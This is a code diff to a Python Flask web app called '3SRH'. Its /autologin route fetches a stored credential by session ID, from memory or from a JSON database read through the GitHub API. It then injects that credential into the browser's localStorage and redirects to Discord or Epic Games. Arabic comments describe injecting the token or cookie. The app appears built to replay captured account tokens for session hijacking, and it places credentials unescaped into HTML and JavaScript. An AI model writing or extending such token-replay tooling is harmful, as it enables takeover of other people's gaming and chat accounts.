@@ -112,8 +112,49 @@ def autologin():
     sid = request.args.get('sid')
     if not sid: return "❌ Invalid Session ID", 400
     
-    if sid in WEB_SESSIONS_MEMORY:
-        credential = WEB_SESSIONS_MEMORY[sid].get("credential")
+    session_data = WEB_SESSIONS_MEMORY.get(sid)
+    platform_type = "discord"
+    credential = ""
+
+    if session_data:
+        platform_type = session_data.get("platform", "discord")
+        credential = session_data.get("credential", "")
+    else:
+        try:
+            url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
+            headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
+            r = requests.get(url, headers=headers, timeout=5)
+            if r.status_code == 200:
+                file_data = r.json()
+                db = json.loads(base64.b64decode(file_data["content"]).decode("utf-8"))
+                sessions = db.get("web_sessions", {})
+                if sid in sessions:
+                    platform_type = sessions[sid].get("platform", "discord")
+                    credential = sessions[sid].get("credential", "")
+        except Exception:
+            pass
+
+    if not credential:
+        return "❌ الرمز غير صالح أو منتهي الصلاحية", 404
+
+    # توجيه مخصص حسب المنصة (إذا كانت إيبك جيمز يفتح موقع إيبك جيمز ويحقن التوكن/الكوكي في الرابط والصفحة)
+    if platform_type == "epic":
+        return f"""
+        <html>
+        <head><title>3SRH Epic Games Auth</title></head>
+        <body style="background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
+            <h2>🎮 جاري حقن جلسة Epic Games وتوجيهك برابط التوكن...</h2>
+            <p style="color: #A871FF; word-break: break-all; padding: 0 20px;">Token/Cookie: {credential}</p>
+            <script>
+                setTimeout(function() {{
+                    localStorage.setItem('epic_token', JSON.stringify("{credential}"));
+                    window.location.href = 'https://www.epicgames.com/id/login?redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Fstore%2Fzh-CN%2F&token={credential}';
+                }}, 1500);
+            </script>
+        </body>
+        </html>
+        """
+    else:
         return f"""
         <html>
         <head><title>3SRH Auto Login</title></head>
@@ -128,34 +169,6 @@ def autologin():
         </body>
         </html>
         """
-
-    try:
-        url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
-        headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
-        r = requests.get(url, headers=headers, timeout=5)
-        if r.status_code == 200:
-            file_data = r.json()
-            db = json.loads(base64.b64decode(file_data["content"]).decode("utf-8"))
-            sessions = db.get("web_sessions", {})
-            if sid in sessions:
-                credential = sessions[sid].get("credential")
-                return f"""
-                <html>
-                <head><title>3SRH Auto Login</title></head>
-                <body style="background-color: #121212; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
-                    <h2>🔄 جاري تسجيل الدخول تلقائياً...</h2>
-                    <script>
-                        setTimeout(function() {{
-                            localStorage.setItem('token', JSON.stringify("{credential}"));
-                            window.location.href = 'https://discord.com/app';
-                        }}, 1000);
-                    </script>
-                </body>
-                </html>
-                """
-    except Exception:
-        pass
-    return "❌ الرمز غير صالح أو منتهي الصلاحية", 404
 
 @app.route('/track')
 def track_visitor():
